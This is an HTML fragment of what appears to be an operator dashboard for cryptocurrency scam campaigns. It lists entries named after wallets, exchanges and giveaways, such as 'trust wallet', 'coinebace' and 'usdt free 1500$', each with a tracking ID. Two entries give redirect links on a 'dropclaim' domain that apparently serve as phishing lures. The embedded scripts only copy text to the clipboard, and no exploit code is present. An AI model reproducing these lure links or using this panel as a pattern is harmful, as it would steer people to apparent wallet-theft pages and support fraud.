+                        <div id="11578" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">baby doge  </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 2 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11578)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink6s" value="3XEZPNAWMNPMJNYET2F39PRDHCQA7X9XJQBDIBAYQPFPG" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink6s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy6s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink6() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink6");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy6").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink6s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink6s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy6s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11575" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">trust wallet  </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 3 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11575)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink7s" value="DP4ZSQVQY4W8M7GZEE9XSLUKEZPHK6MJFNFEGLENSBYNG" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink7s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy7s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink7() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink7");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy7").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink7s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink7s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy7s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11574" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">USDT teether AirDrop </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 3 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11574)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink8s" value="UE7DUG3NDFHPXBV8PRXR2GRRDPBGKNDGVX4DZTI5QUIAK" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink8s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy8s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink8() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink8");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy8").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink8s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink8s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy8s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11573" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">Exchange  </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 3 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11573)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink9s" value="7QNZ5COJ95JEUAA1UKNNJJEN9CQXUKNDRI3CFXCYLPG5N" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink9s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy9s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink9() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink9");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy9").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink9s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink9s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy9s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11572" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">coinebace </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 3 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11572)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink10s" value="NFRNAYHVTHZ1OIUBOPURBADYJRZWLT2MTWJ32XP1DVN87" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink10s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy10s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink10() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink10");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy10").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink10s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink10s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy10s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11571" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">axeb2b.in </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 3 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11571)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink11s" value="TAIDWHRFX7EVYTIAYGKXBSZ5QNCAEFQ9KC8GMGUKQWAJQ" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink11s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy11s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink11() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink11");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy11").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink11s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink11s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy11s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11570" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">usdt free 1500$ </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 3 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11570)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink12s" value="1EQ56TOEG216E2PVP6VREZXSEVRCMFD9FEYZTWQITT4ER" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink12s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy12s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink12() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink12");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy12").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink12s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink12s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy12s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11568" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">pepe </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 4 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11568)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink13s" value="YLXWCDROBOENWHORSJAOVJEXPL3SYYEOWYEI6LBNH9SIS" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink13s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy13s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink13() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink13");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy13").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink13s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink13s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy13s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11567" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Page                        </t>
+                        <b style="font-weight: 400;">BYAC </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 4 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11567)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Redirect to page link</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink14" value="https://dropclaim.shop/?g=TF1JAT8CPNSFKWLYSBM1M3BF8QGN8MEBYRLPLK1U43TGK" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy link" onclick="coppysharelink14()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy14"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink14() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink14");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy14").innerHTML = "Copied !"
+                        }
+                    </script>
+                                    </div>
+            </div>
+                        <div id="11566" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">test maG </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 4 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11566)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink15s" value="CQWECN7ZJRY6BSQN12EX7BJLC8YCCX2FQZ6LKNBUPTDUO" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink15s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy15s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink15() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink15");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy15").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink15s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink15s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy15s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11565" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Page                        </t>
+                        <b style="font-weight: 400;">BYAC </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 4 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11565)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Redirect to page link</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink16" value="https://dropclaim.shop/?g=IOOFNXHX6EDIPESSGTL7IKHSRQWUYEY88QLVIIRFRNEYM" placeholder="0">
